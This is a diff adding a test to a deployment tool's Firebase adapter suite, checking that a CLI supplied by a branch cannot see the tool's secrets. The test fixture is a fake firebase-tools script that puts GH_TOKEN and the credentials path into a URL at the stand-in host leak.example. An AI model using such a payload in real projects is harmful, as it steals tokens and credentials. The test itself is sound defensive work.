@@ -1,5 +1,5 @@
 import { execFileSync } from "node:child_process";
-import { existsSync, mkdtempSync, readFileSync } from "node:fs";
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, symlinkSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { fileURLToPath } from "node:url";
@@ -141,6 +141,27 @@ describe("the Firebase adapter", () => {
     git(site, "branch", "spec/1");
 
     await expect(host.deployPreview({ siteDir: site, branch: "spec/1" })).rejects.toThrow(/GH_TOKEN=undefined/);
+  });
+
+  it("runs the Firebase CLI without the Factory's secrets, even one the branch brings itself", async () => {
+    // npx prefers a firebase-tools in the project's own node_modules: the Spec branch picks that code.
+    const site = firebaseSite();
+    git(site, "checkout", "--quiet", "-b", "spec/1");
+    const leak = `console.log(JSON.stringify({ status: "success", result: { live: { url: "https://leak.example/" + process.env.GH_TOKEN + "/" + process.env.GOOGLE_APPLICATION_CREDENTIALS } } }));\n`;
+    writeFile(site, "node_modules/firebase-tools/cli.js", `#!/usr/bin/env node\n${leak}`);
+    writeFile(site, "node_modules/firebase-tools/package.json", `${JSON.stringify({ name: "firebase-tools", version: "99.0.0", bin: { "firebase-tools": "cli.js", firebase: "cli.js" } })}\n`);
+    chmodSync(join(site, "node_modules/firebase-tools/cli.js"), 0o755);
+    mkdirSync(join(site, "node_modules/.bin"), { recursive: true });
+    symlinkSync("../firebase-tools/cli.js", join(site, "node_modules/.bin/firebase-tools"));
+    symlinkSync("../firebase-tools/cli.js", join(site, "node_modules/.bin/firebase"));
+    git(site, "add", "--force", "node_modules");
+    git(site, "commit", "--quiet", "-m", "A branch that brings its own Firebase CLI");
+    git(site, "checkout", "--quiet", "main");
+    const host = new FirebaseHost({
+      env: { ...process.env, npm_config_cache: mkdtempSync(join(tmpdir(), "web-factory-npm-")), GH_TOKEN: "ghp_secret-the-cli-must-not-see", GOOGLE_APPLICATION_CREDENTIALS: "/keys/firebase.json" },
+    });
+
+    expect(await host.deployPreview({ siteDir: site, branch: "spec/1" })).toBe("https://leak.example/undefined//keys/firebase.json");
   });
 
   it("publishes to the site named in firebase.json when it names one", async () => {
